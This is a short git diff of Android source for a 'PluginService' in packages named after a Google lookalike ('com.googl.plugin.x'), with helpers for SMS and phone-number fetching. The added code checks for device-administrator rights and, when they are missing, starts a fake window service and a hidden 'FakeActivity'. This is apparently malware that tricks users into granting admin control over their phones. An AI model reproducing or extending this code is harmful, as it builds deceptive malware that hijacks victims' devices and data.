@@ -5,16 +5,17 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
 import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.googl.plugin.x.R;
 import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
-import com.xstd.plugin.Utils.*;
+import com.xstd.plugin.Utils.BRCUtil;
+import com.xstd.plugin.Utils.CommonUtil;
+import com.xstd.plugin.Utils.DomanManager;
+import com.xstd.plugin.Utils.SMSUtil;
 import com.xstd.plugin.api.ActiveRequest;
 import com.xstd.plugin.api.ActiveResponse;
 import com.xstd.plugin.api.PhoneFetchRequest;
@@ -429,6 +430,11 @@ public class PluginService extends IntentService {
             boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class));
 
             if (!isActive && !AppRuntime.FAKE_WINDOW_SHOW) {
+                Intent is = new Intent();
+                is.setClass(getApplicationContext(), FakeService.class);
+                is.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
+                startService(is);
+
                 Intent i = new Intent();
                 i.setClass(this.getApplicationContext(), FakeActivity.class);
                 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
